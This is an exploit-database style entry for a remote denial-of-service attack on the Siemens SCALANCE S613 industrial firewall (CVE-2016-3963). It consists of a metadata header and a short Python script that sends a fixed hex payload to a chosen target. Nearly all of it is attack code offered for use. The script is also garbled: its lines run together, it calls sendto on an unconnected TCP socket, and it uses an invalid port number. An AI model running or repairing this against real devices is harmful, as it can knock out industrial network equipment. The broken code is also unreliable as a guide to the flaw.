 # Exploit Title: Siemens SCALANCE S613 - Remote Denial of Service 
# Date: 2018-05-23
# Exploit Author: t4rkd3vilz
# Vendor Homepage: https://www.siemens.com/
# Version: SCALANCE S613 (MLFB: 6GK5613-0BA00-2AA3): All versions.
# Tested on: Kali Linux
# CVE: CVE-2016-3963

#!/usr/bin/python

import socket import sys if len(sys.argv) < 2: print('Usage: ' +
sys.argv[0] + ' [target]') sys.exit(1) print('Sending packet to ' +
sys.argv[1] + ' ...') payload = bytearray('11 49 00 00 00 00 00 00 00 00 00
00 00 00 00 00 28 9E'.replace(' ', '').decode('hex')) sock =
socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.sendto(payload,
(sys.argv[1], 5000000))